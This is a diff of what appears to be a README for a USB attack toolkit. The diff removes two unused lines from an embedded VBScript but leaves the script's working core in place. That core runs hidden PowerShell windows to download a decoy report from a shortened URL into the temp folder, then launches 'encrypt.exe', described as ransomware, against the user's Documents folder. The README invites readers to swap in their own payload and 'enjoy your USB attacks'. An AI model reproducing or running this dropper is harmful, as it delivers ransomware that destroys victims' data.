@@ -286,7 +286,6 @@ Just modify the .vbs file with the payload you want and enjoy your USB attacks! 
 Script that downloads the ransomware + raport.txt and executes it in the Documents folder.
 ```
 Set objShell = CreateObject("Wscript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake raport
 downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/3va6t8n7', '%TEMP%\BIGraport.txt')"""
@@ -304,7 +303,6 @@ objShell.Run downloadCmd, 0, True
 execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""$env:UserProfile\Documents\"""""
 objShell.Run execCmd, 0, True
 
-Set objFSO = Nothing
 Set objShell = Nothing
 ```
 
